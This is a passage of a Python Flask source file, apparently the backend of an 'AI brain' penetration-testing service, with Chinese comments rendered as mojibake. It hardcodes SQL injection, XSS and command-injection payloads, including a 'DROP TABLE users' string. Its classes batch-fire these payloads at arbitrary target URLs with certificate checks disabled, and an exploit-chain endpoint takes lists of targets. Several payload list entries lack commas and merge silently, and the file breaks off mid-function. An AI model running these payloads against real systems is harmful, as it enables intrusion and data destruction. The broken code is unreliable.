        # é‡å­èåˆç®—æ³• - åŸºäºæœ€å¤§ç½®ä¿¡åº¦
        max_component_confidence = max(sql_confidence, xss_confidence, rce_confidence)

        # åŠ æƒèåˆ
        final_confidence = (
                max_component_confidence * 0.65 +
                overall_confidence * 0.25 +
                attack_score * 0.10
        )

        # éçº¿æ€§å¢å¼º
        if final_confidence > 0.75:
            # é«˜ç½®ä¿¡åº¦åŒºåŸŸæŒ‡æ•°å¢å¼º
            final_confidence = 0.75 + (final_confidence - 0.75) * 1.6
        elif final_confidence > 0.5:
            # ä¸­ç½®ä¿¡åº¦åŒºåŸŸçº¿æ€§å¢å¼º
            final_confidence = final_confidence * 1.3

        return round(min(final_confidence, 0.99), 3)

    def _fallback_analysis_advanced(self, text, error_msg):
        """ä¿®å¤fallbackåˆ†æ - åŒ…å«å®Œæ•´æ€§èƒ½æŒ‡æ ‡"""
        text_length = len(text) if text else 0

        return {
            'status': 'success',
            'attack_potential': 0.65,
            'exploitability_score': 0.6,
            'attack_type': {'primary': 'generic', 'confidence': 0.5},
            'attack_chain': {
                'reconnaissance': ['basic_scanning', 'target_identification'],
                'exploitation': ['generic_testing', 'vulnerability_verification']
            },
            'recommended_payloads': [
                "' OR 1=1--",
                "<script>alert(1)</script>",
                "; whoami"
            ],
            'risk_assessment': {
                'level': 'medium',
                'score': 0.65,
                'recommended_actions': ['è°¨æ…æµ‹è¯•', 'éªŒè¯æ¼æ´']
            },
            'mode': 'fallback_mode',
            'fallback_reason': error_msg,
            'timestamp': datetime.now().isoformat(),
            'performance_metrics': {
                'processing_time_ms': 1.0,
                'text_length': text_length,  # ç¡®ä¿è¿™é‡Œè®¾ç½®äº†text_length
                'feature_dimensions': 0
            }
        }

    def _calculate_difficulty(self, attack_score):
        """è®¡ç®—åˆ©ç”¨éš¾åº¦"""
        if attack_score > 0.8:
            return "ä½ (å®¹æ˜“åˆ©ç”¨)"
        elif attack_score > 0.6:
            return "ä¸­ç­‰"
        elif attack_score > 0.4:
            return "è¾ƒé«˜"
        else:
            return "é«˜ (éš¾ä»¥åˆ©ç”¨)"

    def _estimate_business_impact(self, attack_type):
        """ä¼°è®¡ä¸šåŠ¡å½±å“"""
        primary_type = attack_type.get('primary', 'unknown')

        impact_levels = {
            'sql_injection': "é«˜ - å¯èƒ½å¯¼è‡´æ•°æ®æ³„éœ²ã€æ•°æ®ç¯¡æ”¹",
            'xss': "ä¸­ - å¯èƒ½çªƒå–ç”¨æˆ·ä¼šè¯ã€é’“é±¼æ”»å‡»",
            'rce': "æé«˜ - å¯èƒ½å¯¼è‡´ç³»ç»Ÿå®Œå…¨æ²¦é™·",
            'lfi': "ä¸­é«˜ - å¯èƒ½è¯»å–æ•æ„Ÿæ–‡ä»¶",
            'unknown': "å¾…è¯„ä¼° - éœ€è¦è¿›ä¸€æ­¥åˆ†æ"
        }

        return impact_levels.get(primary_type, impact_levels['unknown'])

    def perform_self_repair(self):
        """æ‰§è¡Œè‡ªæˆ‘ä¿®å¤"""
        if hasattr(self, 'self_healing'):
            return self.self_healing.perform_repair()
        else:
            return {"status": "no_self_healing", "actions": ["ç³»ç»Ÿé‡å¯", "ç¼“å­˜æ¸…ç†"]}




# ========== æ–°å¢è¯æ®æ”¶é›†/çœŸå®å‘åŒ…/è‡ªåŠ¨åŒ–æµ‹è¯•èƒ½åŠ› ==========

class EvidenceCollector:
    def __init__(self, log_dir="evidence_logs"):
        self.log_dir = log_dir
        os.makedirs(self.log_dir, exist_ok=True)

    def log_request_response(self, url, method, payload, headers, response, screenshot_path=None, notes=""):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        log = {
            "timestamp": timestamp,
            "url": url,
            "method": method,
            "payload": payload,
            "headers": headers,
            "status_code": response.status_code if response else None,
            "response_length": len(response.text) if response else None,
            "response_hash": hashlib.md5(response.text.encode()).hexdigest() if response else None,
            "screenshot": screenshot_path,
            "notes": notes,
            "response_sample": response.text[:200] if response else None
        }
        log_path = os.path.join(self.log_dir, f"log_{timestamp}.json")
        with open(log_path, "w", encoding="utf-8") as f:
            json.dump(log, f, ensure_ascii=False, indent=2)
        return log_path

    def take_screenshot(self, url, save_path):
        try:
            from selenium import webdriver
            from selenium.webdriver.chrome.options import Options
            chrome_options = Options()
            chrome_options.add_argument("--headless")
            chrome_options.add_argument("--disable-gpu")
            chrome_options.add_argument("--no-sandbox")
            driver = webdriver.Chrome(options=chrome_options)
            driver.set_page_load_timeout(15)
            driver.get(url)
            driver.save_screenshot(save_path)
            driver.quit()
            return save_path
        except Exception:
            return None

class VulnerabilityVerifier:
    def __init__(self, evidence_collector):
        self.evidence_collector = evidence_collector

    def verify(self, url, payload, method="GET", headers=None, cookies=None, take_screenshot=False):
        headers = headers or {}
        cookies = cookies or {}
        screenshot = None
        try:
            if method.upper() == "GET":
                req_url = url if not payload else f"{url}?{payload}"
                resp = requests.get(req_url, headers=headers, cookies=cookies, timeout=10, verify=False)
            else:
                resp = requests.post(url, data=payload, headers=headers, cookies=cookies, timeout=10, verify=False)

            if take_screenshot:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                screenshot_path = os.path.join(self.evidence_collector.log_dir, f"screenshot_{timestamp}.png")
                screenshot = self.evidence_collector.take_screenshot(url, screenshot_path)
            else:
                screenshot_path = None

            log_path = self.evidence_collector.log_request_response(
                url, method, payload, headers, resp, screenshot_path=screenshot_path
            )

            # ç®€å•æ¼æ´ç‰¹å¾
            indicators = []
            if resp.status_code >= 500 or "error" in resp.text.lower() or "warning" in resp.text.lower():
                indicators.append("ServerError")
            if payload and payload.strip() in resp.text:
                indicators.append("PayloadReflected")
            waf_keywords = ["waf", "blocked", "forbidden", "firewall", "deny", "intercept"]
            if any(w in resp.text.lower() for w in waf_keywords):
                indicators.append("WAFBlock")
            xss_keywords = ["<script>", "alert(", "onerror", "onload"]
            if any(x in resp.text.lower() for x in xss_keywords):
                indicators.append("XSSPossible")

            return {
                "url": url,
                "payload": payload,
                "method": method,
                "status_code": resp.status_code,
                "response_sample": resp.text[:400],
                "evidence_log": log_path,
                "screenshot": screenshot_path,
                "indicators": indicators
            }
        except Exception as ex:
            return {
                "url": url,
                "payload": payload,
                "method": method,
                "status_code": None,
                "response_sample": None,
                "evidence_log": None,
                "screenshot": None,
                "indicators": ["RequestException"],
                "exception": str(ex),
                "trace": traceback.format_exc()
            }

class AutomatedTester:
    def __init__(self, verifier, payloads):
        self.verifier = verifier
        self.payloads = payloads

    def batch_test(self, url, method="GET", headers=None, cookies=None, take_screenshot=False):
        results = []
        for payload in self.payloads:
            result = self.verifier.verify(
                url, payload, method=method, headers=headers, cookies=cookies,
                take_screenshot=take_screenshot
            )
            results.append(result)
        return results
		
		
# ========== é¡¶çº§ä¸“ä¸šæ¸—é€ä¸‰å¤§åŠŸèƒ½å¢å¼º ==========

class ProEvidenceCollector(EvidenceCollector):
    def log_request_response(self, url, method, payload, headers, response, screenshot_path=None, notes="", extra=None):
        # å¢å¼º: è®°å½•æ›´å¤šä¸Šä¸‹æ–‡ã€æ”¯æŒè‡ªå®šä¹‰æ‰©å±•å­—æ®µ
        log = super().log_request_response(url, method, payload, headers, response, screenshot_path, notes)
        if extra:
            with open(log, "r+", encoding="utf-8") as f:
                data = json.load(f)
                data.update(extra)
                f.seek(0)
                json.dump(data, f, ensure_ascii=False, indent=2)
        return log

    def take_screenshot(self, url, save_path, window_size=(1200, 900), full_page=True):
        # å¢å¼º: æ”¯æŒå…¨é¡µé¢æˆªå›¾/è‡ªå®šä¹‰çª—å£
        try:
            from selenium import webdriver
            from selenium.webdriver.chrome.options import Options
            chrome_options = Options()
            chrome_options.add_argument("--headless")
            chrome_options.add_argument(f"--window-size={window_size[0]},{window_size[1]}")
            driver = webdriver.Chrome(options=chrome_options)
            driver.get(url)
            if full_page:
                S = lambda X: driver.execute_script('return document.body.parentNode.scroll'+X)
                driver.set_window_size(S('Width'),S('Height'))
            driver.save_screenshot(save_path)
            driver.quit()
            return save_path
        except Exception:
            return None

class ProVulnerabilityVerifier(VulnerabilityVerifier):
    def verify(self, url, payload, method="GET", headers=None, cookies=None, vuln_type=None, take_screenshot=False, param_inject=None, payload_profile=None, extra=None):
        headers = headers or {}
        cookies = cookies or {}
        screenshot_path = None
        try:
            # è‡ªåŠ¨å‚æ•°æ³¨å…¥ç‚¹
            if param_inject:
                from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
                u = urlparse(url)
                params = dict(parse_qsl(u.query))
                params[param_inject] = payload
                url = urlunparse(u._replace(query=urlencode(params)))
                payload_to_send = None
            else:
                payload_to_send = payload

            # æ”¯æŒ POST JSON
            if method.upper() == "POST" and headers.get("Content-Type", "").startswith("application/json"):
                resp = requests.post(url, json=payload_to_send, headers=headers, cookies=cookies, timeout=15, verify=False)
            elif method.upper() == "POST":
                resp = requests.post(url, data=payload_to_send, headers=headers, cookies=cookies, timeout=15, verify=False)
            else:
                req_url = url if not payload_to_send else f"{url}?{payload_to_send}"
                resp = requests.get(req_url, headers=headers, cookies=cookies, timeout=15, verify=False)

            # ä¸“ä¸šæ¼æ´ç‰¹å¾æ£€æµ‹ï¼ˆå¯æ‰©å±•ï¼‰
            indicators = []
            if resp.status_code >= 500 or "error" in resp.text.lower():
                indicators.append("ServerError")
            if payload and payload.strip() in resp.text:
                indicators.append("PayloadReflected")
            if vuln_type == "sql_injection" and any(x in resp.text.lower() for x in ["sql", "syntax", "mysql", "odbc", "sqlite", "warning"]):
                indicators.append("SQLiError")
            if vuln_type == "xss" and any(x in resp.text.lower() for x in ["<script>", "alert(", "onerror", "onload"]):
                indicators.append("XSSPossible")
            waf_keywords = ["waf", "blocked", "forbidden", "firewall", "deny", "intercept"]
            if any(w in resp.text.lower() for w in waf_keywords):
                indicators.append("WAFBlock")

            # æ™ºèƒ½æˆªå›¾/è¯æ®å¢å¼º
            if take_screenshot:
                screenshot_path = self.evidence_collector.take_screenshot(url, f"{self.evidence_collector.log_dir}/screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")

            log_path = self.evidence_collector.log_request_response(
                url, method, payload, headers, resp, screenshot_path=screenshot_path, extra=extra
            )
            return {
                "url": url,
                "payload": payload,
                "method": method,
                "status_code": resp.status_code,
                "response_sample": resp.text[:400],
                "evidence_log": log_path,
                "screenshot": screenshot_path,
                "indicators": indicators
            }
        except Exception as ex:
            return {
                "url": url,
                "payload": payload,
                "method": method,
                "status_code": None,
                "response_sample": None,
                "evidence_log": None,
                "screenshot": None,
                "indicators": ["RequestException"],
                "exception": str(ex),
                "trace": traceback.format_exc()
            }

class ProAutomatedTester(AutomatedTester):
    def __init__(self, verifier, payload_profiles):
        self.verifier = verifier
        self.payload_profiles = payload_profiles  # dict: {vuln_type: [payloads]}
    def batch_test(self, url, method="GET", headers=None, cookies=None, take_screenshot=False, test_types=None, param_inject=None):
        results = []
        # æŒ‰ test_types æ‰¹é‡ fuzz
        if not test_types:
            test_types = list(self.payload_profiles.keys())
        for vuln_type in test_types:
            payloads = self.payload_profiles.get(vuln_type, [])
            for payload in payloads:
                result = self.verifier.verify(
                    url, payload, method=method, headers=headers, cookies=cookies,
                    vuln_type=vuln_type, take_screenshot=take_screenshot, param_inject=param_inject,
                    extra={"test_type": vuln_type}
                )
                results.append(result)
        return results

# ========== åˆå§‹åŒ–å¢å¼ºç‰ˆç»„ä»¶ ==========

pro_evidence_collector = ProEvidenceCollector()
pro_vuln_verifier = ProVulnerabilityVerifier(pro_evidence_collector)
pro_payload_profiles = {
    "sql_injection": [
        "' OR 1=1--",
        "' UNION SELECT NULL,version(),user()--",
        "' AND 1=2--",
        "\" OR \"1\"=\"1\"--"
		"' AND SLEEP(5)--",
		"'; DROP TABLE users--",
		"' OR 'a'='a"
		"' UNION SELECT NULL--",
		
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>"
		"\"><script>alert(1)</script>"
		"javascript:alert(1)",
    ],
    "rce": [
        "; whoami",
        "| id",
        "`id`",
        "$(id)"
    ]
}
pro_auto_tester = ProAutomatedTester(pro_vuln_verifier, pro_payload_profiles)



# ==================== Flaskåº”ç”¨åˆå§‹åŒ– ====================
brain_api = None
app_start_time = time.time()
init_lock = threading.Lock()

# ğŸ”§ ä¿®æ”¹ä»£ç ä½ç½® - æ›¿æ¢åŸæœ‰çš„initialize_brain_apiå‡½æ•°
def initialize_brain_api():
    global brain_api
    with init_lock:
        if brain_api is None:
            try:
                # ä½¿ç”¨å¢å¼ºç‰ˆAPI
                brain_api = EnhancedDynamicBrainAPI('dynamic_brain_optimized_20250905.pth')
                brain_api.start_time = time.time()
                logger.info("âœ… å¢å¼ºç‰ˆåŠ¨æ€å¤§è„‘APIåˆå§‹åŒ–å®Œæˆ")
                return True
            except Exception as e:
                logger.error("å¢å¼ºç‰ˆåˆå§‹åŒ–å¤±è´¥: {}".format(e))
                # å›é€€åˆ°åŸºç¡€ç‰ˆæœ¬
                try:
                    brain_api = DynamicBrainAPI('dynamic_brain_optimized_20250905.pth')
                    logger.info("âœ… åŸºç¡€ç‰ˆåŠ¨æ€å¤§è„‘APIåˆå§‹åŒ–å®Œæˆ")
                    return True
                except Exception as e2:
                    logger.error("åŸºç¡€ç‰ˆåˆå§‹åŒ–ä¹Ÿå¤±è´¥: {}".format(e2))
                    return False
    return True

#====================================================
@app.before_request
def check_initialization():
    if brain_api is None:
        initialize_brain_api()



# ==================== APIç«¯ç‚¹å®šä¹‰ ====================
@app.route('/')
def index():
    if brain_api is None:
        if not initialize_brain_api():
            return jsonify({'status': 'error', 'message': 'ç³»ç»Ÿåˆå§‹åŒ–å¤±è´¥'}), 500

    uptime_seconds = time.time() - app_start_time
    uptime_str = "{}å°æ—¶ {}åˆ†é’Ÿ".format(int(uptime_seconds // 3600), int((uptime_seconds % 3600) // 60))

    # æ‰‹åŠ¨æ›¿æ¢æ¨¡æ¿å˜é‡
    html_content = HTML_TEMPLATE \
        .replace('{{ version }}', '2.0-penetration') \
        .replace('{{ timestamp }}', datetime.now().strftime('%Y-%m-%d %H:%M:%S')) \
        .replace('{{ uptime }}', uptime_str) \
        .replace('{% for action in attack_actions %}<span class="attack-tag">{{ action }}</span>{% endfor %}',
                 ''.join(['<span class="attack-tag">{}</span>'.format(action) for action in
                          ['EXPLOIT', 'RECON', 'SCAN', 'PERSIST']]))

    from flask import Response
    return Response(html_content, mimetype='text/html')


@app.route('/api/analyze', methods=['POST'])
def analyze_endpoint():
    """å®‰å…¨åˆ†æç«¯ç‚¹ - å¢å¼ºé”™è¯¯å¤„ç†"""
    if brain_api is None:
        return jsonify({'error': 'ç³»ç»Ÿæœªåˆå§‹åŒ–', 'code': 'SYS_NOT_READY'}), 503

    try:
        # è·å–å¹¶éªŒè¯æ•°æ®
        data = request.get_json()
        if not data:
            return jsonify({'error': 'ç¼ºå°‘JSONæ•°æ®', 'code': 'MISSING_JSON'}), 400

        text = data.get('text', '')
        if not text:
            return jsonify({'error': 'ç¼ºå°‘textå‚æ•°', 'code': 'MISSING_TEXT'}), 400
            
        # é•¿åº¦æ£€æŸ¥å’Œå»ºè®®
        if len(text) > 10000:
            return jsonify({
                'error': 'æ–‡æœ¬è¿‡é•¿', 
                'code': 'TEXT_TOO_LONG',
                'message': 'æœ€å¤§æ”¯æŒ10000å­—ç¬¦ï¼Œå½“å‰é•¿åº¦: {}'.format(len(text)),
                'suggestion': 'è¯·ç¼©çŸ­æ–‡æœ¬æˆ–ä½¿ç”¨åˆ†æ®µå¤„ç†'
            }), 400

        # é¢„å¤„ç†æ–‡æœ¬
        processed_text = preprocess_text(text)
        
        # æ‰§è¡Œåˆ†æ
        analysis_result = brain_api.analyze_security(processed_text)
        
        return jsonify({
            'status': 'success',
            'data': analysis_result,
            'timestamp': datetime.now().isoformat(),
            'text_length': len(text)
        })

    except Exception as e:
        logger.error("å®‰å…¨åˆ†æé”™è¯¯: {}".format(e))
        return jsonify({
            'error': 'åˆ†æå¤„ç†å¤±è´¥',
            'message': str(e),
            'code': 'ANALYSIS_ERROR'
        }), 500


def preprocess_text(text):
    """é¢„å¤„ç†æ–‡æœ¬ï¼šå¤„ç†ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰"""
    if not text:
        return text

    if not isinstance(text, str):
        text = str(text)

    # å¤„ç†å¸¸è§çš„JSONè½¬ä¹‰é—®é¢˜
    text = text.replace("\\'", "'").replace('\\"', '"')

    # å¤„ç†URLç¼–ç ï¼ˆå¯é€‰ï¼‰
    try:
        import urllib.parse
        text = urllib.parse.unquote(text)
    except:
        pass

    return text


@app.route('/api/meta-cognition', methods=['POST'])
def meta_cognition_endpoint():
    if brain_api is None: return jsonify({'error': 'ç³»ç»Ÿæœªåˆå§‹åŒ–', 'code': 'SYS_NOT_READY'}), 503
    try:
        data = request.get_json()
        if not data or 'text' not in data: return jsonify({'error': 'ç¼ºå°‘textå‚æ•°', 'code': 'MISSING_PARAM'}), 400
        result = brain_api.meta_cognition_analysis(data.get('text', ''))
        return jsonify({'status': 'success', 'data': result, 'timestamp': datetime.now().isoformat()})
    except Exception as e:
        logger.error("å…ƒè®¤çŸ¥åˆ†æé”™è¯¯: {}".format(e))
        return jsonify({'error': 'å…ƒè®¤çŸ¥åˆ†æå¤±è´¥', 'message': str(e), 'code': 'META_COGNITION_ERROR'}), 500


@app.route('/api/intelligent-reasoning', methods=['POST'])
def intelligent_reasoning_endpoint():
    """
    é¡¶çº§ä¸“ä¸šç‰ˆæ™ºèƒ½æ¨ç†ç«¯ç‚¹
    - æ”¯æŒæ— é™é•¿æ–‡æœ¬
    - è‡ªåŠ¨åˆ†ç‰‡æ¨ç†ï¼Œæ™ºèƒ½èšåˆ
    - è¿”å›æ¯ç‰‡è¯¦ç»†ç»“æœä¸èšåˆå¤§ç»“è®º
    """
    import time
    start_time = time.time()

    if brain_api is None:
        return jsonify({'error': 'ç³»ç»Ÿæœªåˆå§‹åŒ–', 'code': 'SYS_NOT_READY'}), 503

    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'ç¼ºå°‘JSONæ•°æ®', 'code': 'MISSING_JSON'}), 400

        text = data.get('text', '')
        scenario = data.get('scenario', '')  # å…¼å®¹æ—§å‚æ•°
        if not text and scenario:
            text = scenario

        if not text or not isinstance(text, str):
            return jsonify({'error': 'textå‚æ•°ä¸èƒ½ä¸ºç©ºä¸”å¿…é¡»ä¸ºå­—ç¬¦ä¸²', 'code': 'INVALID_TEXT'}), 400

        # åˆ†ç‰‡é•¿åº¦å¯æ ¹æ®æ¨¡å‹èƒ½åŠ›è°ƒæ•´
        CHUNK_SIZE = 1000
        text_length = len(text)
        chunks = [text[i:i+CHUNK_SIZE] for i in range(0, text_length, CHUNK_SIZE)]
        sub_results = []
        attack_types = []
        confidences = []
        errors = 0

        for idx, chunk in enumerate(chunks):
            part_data = dict(data)
            part_data['text'] = chunk
            try:
                result = brain_api.intelligent_reasoning(part_data)
                # å…¼å®¹ä¸åŒæ¨¡å‹è¾“å‡ºç»“æ„
                attack_type = (
                    result.get('hypotheses', ['æœªçŸ¥'])[0]
                    if result.get('hypotheses') else 'æœªçŸ¥'
                )
                confidence = result.get('confidence', 0)
                sub_results.append({
                    'chunk_index': idx,
                    'text_snippet': chunk[:50] + ('...' if len(chunk) > 50 else ''),
                    'attack_type': attack_type,
                    'confidence': confidence,
                    'raw_result': result
                })
                attack_types.append(attack_type)
                confidences.append(confidence)
            except Exception as e:
                errors += 1
                sub_results.append({
                    'chunk_index': idx,
                    'text_snippet': chunk[:50] + ('...' if len(chunk) > 50 else ''),
                    'error': str(e)
                })

        # æ™ºèƒ½èšåˆ
        if confidences:
            max_conf = max(confidences)
            avg_conf = sum(confidences) / len(confidences)
            main_attack_type = max(set(attack_types), key=attack_types.count)
        else:
            max_conf = avg_conf = 0
            main_attack_type = "åˆ†æå¤±è´¥"

        agg = {
            'main_attack_type': main_attack_type,
            'max_confidence': max_conf,
            'avg_confidence': avg_conf,
            'chunk_count': len(chunks),
            'error_chunks': errors,
            'text_length': text_length,
            'aggregation_method': 'max_confidence + mode(attack_type)'
        }

        return jsonify({
            'status': 'success',
            'aggregation': agg,
            'sub_results': sub_results,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'elapsed_ms': int((time.time() - start_time) * 1000)
        })
    except Exception as e:
        logger.error("æ™ºèƒ½æ¨ç†é”™è¯¯: {}".format(e))
        return jsonify({
            'error': 'æ™ºèƒ½æ¨ç†å¤±è´¥',
            'message': str(e),
            'code': 'REASONING_ERROR'
        }), 500


@app.route('/api/decision', methods=['POST'])
def decision_endpoint():
    """
    é¡¶çº§ä¸“ä¸šç‰ˆæ¸—é€å†³ç­–ç”Ÿæˆ
    - æ”¯æŒå•æ¡/å¤šæ¡/è¶…é•¿è‡ªåŠ¨åˆ†ç‰‡
    - æ™ºèƒ½èšåˆå†³ç­–ï¼Œè¯¦ç»†æ€§èƒ½ä¸é”™è¯¯ç»Ÿè®¡
    """
    import time
    start_time = time.time()
    if brain_api is None:
        return jsonify({'error': 'ç³»ç»Ÿæœªåˆå§‹åŒ–', 'code': 'SYS_NOT_READY'}), 503

    try:
        if not request.is_json:
            logger.error(f"å†³ç­–ç”Ÿæˆè¯·æ±‚ä¸æ˜¯JSON: headers={request.headers}, body={request.data}")
            return jsonify({'error': 'Content-Typeå¿…é¡»ä¸ºapplication/json', 'code': 'NOT_JSON'}), 400

        data = request.get_json(silent=True)
        if not data:
            logger.error(f"å†³ç­–ç”Ÿæˆè¯·æ±‚ç¼ºå°‘JSONä½“: body={request.data}")
            return jsonify({'error': 'ç¼ºå°‘JSONæ•°æ®', 'code': 'MISSING_JSON'}), 400

        # æ”¯æŒ text ä¸ºå­—ç¬¦ä¸²æˆ–æ•°ç»„
        input_data = data.get('text')
        if input_data is None:
            return jsonify({'error': 'ç¼ºå°‘textå‚æ•°', 'code': 'MISSING_TEXT'}), 400

        if isinstance(input_data, str):
            input_list = [input_data]
        elif isinstance(input_data, list):
            input_list = input_data
        else:
            return jsonify({'error': 'textå‚æ•°å¿…é¡»ä¸ºå­—ç¬¦ä¸²æˆ–æ•°ç»„', 'code': 'INVALID_TEXT'}), 400

        CHUNK_SIZE = 2000  # è¶…é•¿æ–‡æœ¬è‡ªåŠ¨åˆ†ç‰‡
        all_results = []
        errors = 0
        all_strategies = []
        confidences = []

        for idx, item in enumerate(input_list):
            try:
                item_str = preprocess_text(str(item))
                item_len = len(item_str)
                if item_len > CHUNK_SIZE:
                    # è¶…é•¿è‡ªåŠ¨åˆ†ç‰‡
                    chunks = [item_str[i:i+CHUNK_SIZE] for i in range(0, item_len, CHUNK_SIZE)]
                    chunk_results = []
                    for cidx, chunk in enumerate(chunks):
                        chunk_data = dict(data)
                        chunk_data['text'] = chunk
                        cres = brain_api.make_decision(chunk_data)
                        chunk_results.append({
                            'chunk_index': cidx,
                            'chunk_length': len(chunk),
                            'result': cres
                        })
                        all_strategies.append(cres.get('strategy_decision', 'æœªçŸ¥'))
                        confidences.append(cres.get('confidence', 0))
                    # èšåˆåˆ†ç‰‡
                    main_conf = max((c['result'].get('confidence', 0) for c in chunk_results), default=0)
                    main_strategy = max(set([c['result'].get('strategy_decision', 'æœªçŸ¥') for c in chunk_results]), key=[c['result'].get('strategy_decision', 'æœªçŸ¥') for c in chunk_results].count)
                    all_results.append({
                        'index': idx,
                        'input_length': item_len,
                        'chunk_count': len(chunk_results),
                        'chunks': chunk_results,
                        'aggregation': {
                            'main_strategy': main_strategy,
                            'max_confidence': main_conf
                        }
                    })
                else:
                    d = dict(data)
                    d['text'] = item_str
                    res = brain_api.make_decision(d)
                    all_results.append({
                        'index': idx,
                        'input_length': item_len,
                        'result': res
                    })
                    all_strategies.append(res.get('strategy_decision', 'æœªçŸ¥'))
                    confidences.append(res.get('confidence', 0))
            except Exception as e:
                errors += 1
                logger.error(f"å†³ç­–ç”Ÿæˆå•æ¡é”™è¯¯ idx={idx}: {e}")
                all_results.append({
                    'index': idx,
                    'input_length': len(str(item)),
                    'error': str(e)
                })

        # æ™ºèƒ½èšåˆä¸»å†³ç­–
        if all_strategies:
            main_strategy = max(set(all_strategies), key=all_strategies.count)
            max_conf = max(confidences, default=0)
            avg_conf = sum(confidences) / len(confidences) if confidences else 0
        else:
            main_strategy = "åˆ†æå¤±è´¥"
            max_conf = avg_conf = 0

        agg = {
            'total': len(input_list),
            'success': len(input_list) - errors,
            'failed': errors,
            'main_strategy': main_strategy,
            'max_confidence': max_conf,
            'avg_confidence': avg_conf,
            'aggregation_method': 'majority_vote(strategy_decision)+max_confidence',
            'elapsed_ms': int((time.time() - start_time) * 1000)
        }

        return jsonify({
            'status': 'success',
            'aggregation': agg,
            'results': all_results,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        })
    except Exception as e:
        logger.error("å†³ç­–ç”Ÿæˆé”™è¯¯: {}".format(e))
        return jsonify({
            'error': 'å†³ç­–ç”Ÿæˆå¤±è´¥',
            'message': str(e),
            'code': 'DECISION_ERROR'
        }), 500

@app.route('/api/resource-management', methods=['POST'])
def resource_management_endpoint():
    if brain_api is None: return jsonify({'error': 'ç³»ç»Ÿæœªåˆå§‹åŒ–', 'code': 'SYS_NOT_READY'}), 503
    try:
        data = request.get_json()
        result = brain_api.manage_resources(data)
        return jsonify({'status': 'success', 'data': result, 'timestamp': datetime.now().isoformat()})
    except Exception as e:
        logger.error("èµ„æºç®¡ç†é”™è¯¯: {}".format(e))
        return jsonify({'error': 'èµ„æºç®¡ç†å¤±è´¥', 'message': str(e), 'code': 'RESOURCE_ERROR'}), 500


@app.route('/api/knowledge', methods=['POST'])
def knowledge_endpoint():
    if brain_api is None: return jsonify({'error': 'ç³»ç»Ÿæœªåˆå§‹åŒ–', 'code': 'SYS_NOT_READY'}), 503
    try:
        data = request.get_json()
        if not data or 'operation' not in data: return jsonify(
            {'error': 'ç¼ºå°‘operationå‚æ•°', 'code': 'MISSING_OPERATION'}), 400
        result = brain_api.knowledge_operations(data.get('operation', ''), data)
        return jsonify({'status': 'success', 'data': result, 'timestamp': datetime.now().isoformat()})
    except Exception as e:
        logger.error("çŸ¥è¯†ç®¡ç†é”™è¯¯: {}".format(e))
        return jsonify({'error': 'çŸ¥è¯†æ“ä½œå¤±è´¥', 'message': str(e), 'code': 'KNOWLEDGE_ERROR'}), 500


@app.route('/api/security-enhancement', methods=['POST'])
def security_enhancement_endpoint():
    if brain_api is None: return jsonify({'error': 'ç³»ç»Ÿæœªåˆå§‹åŒ–', 'code': 'SYS_NOT_READY'}), 503
    try:
        data = request.get_json()
        result = brain_api.security_enhancement(data)
        return jsonify({'status': 'success', 'data': result, 'timestamp': datetime.now().isoformat()})
    except Exception as e:
        logger.error("å®‰å…¨å¢å¼ºé”™è¯¯: {}".format(e))
        return jsonify({'error': 'å®‰å…¨å¢å¼ºå¤±è´¥', 'message': str(e), 'code': 'SECURITY_ERROR'}), 500


@app.route('/api/system', methods=['POST'])
def system_endpoint():
    if brain_api is None: return jsonify({'error': 'ç³»ç»Ÿæœªåˆå§‹åŒ–', 'code': 'SYS_NOT_READY'}), 503
    try:
        data = request.get_json()
        if not data or 'command' not in data: return jsonify(
            {'error': 'ç¼ºå°‘commandå‚æ•°', 'code': 'MISSING_COMMAND'}), 400
        result = brain_api.system_management(data.get('command', ''), data.get('parameters', {}))
        return jsonify({'status': 'success', 'data': result, 'timestamp': datetime.now().isoformat()})
    except Exception as e:
        logger.error("ç³»ç»Ÿç®¡ç†é”™è¯¯: {}".format(e))
        return jsonify({'error': 'ç³»ç»Ÿç®¡ç†å¤±è´¥', 'message': str(e), 'code': 'SYSTEM_ERROR'}), 500


@app.route('/api/exploit-chain', methods=['POST'])
def exploit_chain_endpoint():
    """
    é¡¶çº§ä¸“ä¸šç‰ˆæ¼æ´åˆ©ç”¨é“¾ç«¯ç‚¹
    - æ”¯æŒæ‰¹é‡ç›®æ ‡ã€è¶…é•¿payloadæ™ºèƒ½åˆ†ç‰‡
    - è¯¦ç»†èšåˆç»Ÿè®¡ã€å¼‚å¸¸ä¸ä¸­æ–­ã€å®¡è®¡æ—¥å¿—
    """
    import time
    start_time = time.time()
    if brain_api is None:
        return jsonify({'error': 'ç³»ç»Ÿæœªåˆå§‹åŒ–', 'code': 'SYS_NOT_READY'}), 503

    try:
        if not request.is_json:
            logger.error(f"æ¼æ´åˆ©ç”¨é“¾è¯·æ±‚ä¸æ˜¯JSON: headers={request.headers}, body={request.data[:200]}")
            return jsonify({'error': 'Content-Typeå¿…é¡»ä¸ºapplication/json', 'code': 'NOT_JSON'}), 400

        data = request.get_json(silent=True)
        if not data:
            logger.error(f"æ¼æ´åˆ©ç”¨é“¾è¯·æ±‚ç¼ºå°‘JSONä½“: body={request.data[:500]}")
            return jsonify({'error': 'ç¼ºå°‘JSONæ•°æ®', 'code': 'MISSING_JSON'}), 400

        # æ”¯æŒ target_url æˆ– targetsï¼ˆå•æ¡æˆ–æ‰¹é‡ï¼‰
        targets = data.get('targets') or [data.get('target_url')] if data.get('target_url') else []
        if isinstance(targets, str):
            targets = [targets]
        # å…¼å®¹å•ç›®æ ‡
        targets = [t for t in targets if t]

        if not targets:
            logger.error("æ¼æ´åˆ©ç”¨é“¾ç¼ºå°‘ç›®æ ‡å‚æ•°")
            return jsonify({'error': 'ç¼ºå°‘ç›®æ ‡å‚æ•°(target_url/targets)', 'code': 'MISSING_TARGET'}), 400

        operation = data.get('operation', 'exploit_chain')
        # å…¶ä»–payload/payloads/chain_profileæŒ‰éœ€æ‰©å±•

        BATCH_SIZE = 1  # å¦‚éœ€æ‰¹é‡å¹¶å‘å¤„ç†å¯è°ƒå¤§
        results = []
        errors = 0

